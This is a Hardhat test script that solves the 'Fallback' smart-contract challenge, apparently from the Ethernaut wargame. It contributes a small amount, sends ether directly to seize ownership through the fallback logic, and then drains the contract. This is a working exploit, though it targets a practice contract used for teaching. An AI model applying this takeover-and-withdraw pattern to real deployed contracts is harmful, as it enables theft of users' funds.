const { ethers } = require("hardhat")
const { expect } = require("chai")

const CONTRACT_NAME = "Fallback"

describe(CONTRACT_NAME, () => {
    let _owner
    let attacker
    let contract
    let tx

    beforeEach(async () => {
        ;[_owner, attacker] = await ethers.getSigners()
        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy()
        await contract.deployed()

        contract = contract.connect(attacker)
    })

    it("Solves the challenge", async () => {
        // Contribute to appear in the `contributors` array
        tx = await contract.contribute({ value: 1 })
        await tx.wait()
        // Take ownership of the contract
        tx = await attacker.sendTransaction({
            to: contract.address,
            value: 1,
        })
        await tx.wait()

        // Withdraw remaining eth
        tx = await contract.withdraw()
        await tx.wait()

        // Test
        const balance = await ethers.provider.getBalance(contract.address)
        const owner = await contract.owner()

        expect(balance).to.eq(0)
        expect(owner).to.eq(attacker.address)
    })
})
